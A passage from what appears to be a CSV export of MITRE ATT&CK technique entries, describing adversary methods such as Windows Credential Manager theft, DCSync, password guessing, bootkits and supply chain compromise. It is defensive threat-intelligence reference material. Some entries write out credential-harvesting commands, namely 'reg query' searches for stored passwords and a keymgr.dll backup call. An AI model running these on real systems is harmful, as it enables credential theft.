Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,FALSE,FALSE,2020-10-02T16:37:30Z
attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447,4,T1555.004,Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)

The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)

Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.

Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",Windows,FALSE,FALSE,2020-11-23T15:35:53Z
attack-pattern--d349c66e-18e1-4d8b-a2d7-65af7cbd2ba0,4,T1036.010,Masquerade Account Name,"Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023)

Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.”(Citation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087).  

Note that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1684/001), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.","Containers, IaaS, Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2024-08-05T21:39:16Z
attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49,4,T1111,Multi-Factor Authentication Interception,"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. 

If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)

Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)

Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.(Citation: Okta Scatter Swine 2022)","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:23Z
attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163,4,T1003.006,DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.

Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)

DCSync functionality has been included in the ""lsadump"" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",Windows,FALSE,FALSE,2020-02-11T18:45:34Z
attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc,4,T1529,System Shutdown/Reboot,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.

Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.

Adversaries may also use Windows API functions, such as `InitializeSystemShutdownExW` or `ExitWindowsEx`, to force a system to shut down or reboot.(Citation: CrowdStrike Blog)(Citation: Unit42 Agrius 2023) Alternatively, the `NtRaiseHardError`or `ZwRaiseHardError` Windows API functions with the `ResponseOption` parameter set to `OptionShutdownSystem` may deliver a “blue screen of death” (BSOD) to a system.(Citation: SonicWall)(Citation: NtRaiseHardError)(Citation: NotMe-BSOD) In order to leverage these API functions, an adversary may need to acquire `SeShutdownPrivilege` (e.g., via [Access Token Manipulation](https://attack.mitre.org/techniques/T1134)).(Citation: Unit42 Agrius 2023)
 In some cases, the system may not be able to boot again. 

Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2019-10-04T20:42:28Z
attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d,3,T1557,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1689)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to impair defenses and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-02-11T19:07:12Z
attack-pattern--0533ab23-3f7d-463f-9bd8-634d27e4dee1,3,T1027.009,Embedded Payloads,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) 

Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) 

For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) 

Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)","Linux, macOS, Windows",FALSE,FALSE,2022-09-30T18:50:14Z
attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345,3,T1222.002,Linux and Mac Permissions,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).

Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques)","Linux, macOS",FALSE,FALSE,2020-02-04T19:24:27Z
attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119,3,T1110.001,Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)
* SNMP (161/UDP and 162/TCP/UDP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2020-02-11T18:38:22Z
attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3,3,T1590.005,IP Addresses,"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T15:59:11Z
attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81,3,T1583.002,DNS Server,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.

By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",PRE,FALSE,FALSE,2020-10-01T00:40:45Z
attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba,3,T1542.003,Bootkit,"Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)

The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)","Linux, Windows",FALSE,FALSE,2019-12-19T21:05:38Z
attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6,3,T1568.001,Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)

The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)

In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.","Linux, macOS, Windows, ESXi",FALSE,FALSE,2020-03-11T14:11:16Z
attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c,3,T1053.003,Cron,"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.

An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)","Linux, macOS, ESXi",FALSE,FALSE,2019-12-03T14:25:00Z
attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327,3,T1588.006,Vulnerabilities,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)

An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",PRE,FALSE,FALSE,2020-10-15T02:59:38Z
attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3,3,T1098.003,Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)
(Citation: Microsoft O365 Admin Roles) 

This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.

For example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)

In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)","IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2020-01-19T16:59:45Z
attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074,3,T1583.005,Botnet,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. 

Internet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks – consisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices – to serve as a botnet.(Citation: ORB Mandiant) 

With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Acquired botnets may also be used to support Command and Control activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) network.

",PRE,FALSE,FALSE,2020-10-01T00:49:05Z
attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580,3,T1552.002,Credentials in Registry,"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",Windows,FALSE,FALSE,2020-02-04T12:58:40Z
attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf,3,T1587.002,Code Signing Certificates,"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",PRE,FALSE,FALSE,2020-10-01T01:41:08Z
attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42,3,T1556.002,Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. 

Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. 

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",Windows,FALSE,FALSE,2020-02-11T19:05:45Z
attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7,3,T1195,Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.

Supply chain compromise can take place at any stage of the supply chain including:

* Manipulation of development tools
* Manipulation of a development environment
* Manipulation of source code repositories (public or private)
* Manipulation of source code in open-source dependencies
* Manipulation of software update/distribution mechanisms
* Compromised/infected system images (removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) 
* Replacement of legitimate software with modified versions
* Sales of modified/counterfeit products to legitimate distributors
* Shipment interdiction

While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Adversaries may limit targeting to a desired victim set or distribute malicious software to a broad set of consumers but only follow up with specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open-source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)

In some cases, adversaries may conduct “second-order” supply chain compromises by leveraging the access gained from an initial supply chain compromise to further compromise a software component.(Citation: Krebs 3cx overview 2023) This may allow the threat actor to spread to even more victims.","Linux, Windows, macOS, SaaS",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--451a9977-d255-43c9-b431-66de80130c8c,3,T1205,Traffic Signaling,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--4a2975db-414e-4c0c-bd92-775987514b4b,3,T1564.011,Ignore Process Interrupts,"Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. 

Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.

Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.","Linux, macOS, Windows",FALSE,FALSE,2023-08-24T17:23:34Z
attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830,3,T1010,Application Window Discovery,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)

Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:24Z
attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba,3,T1021,Remote Services,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter. 

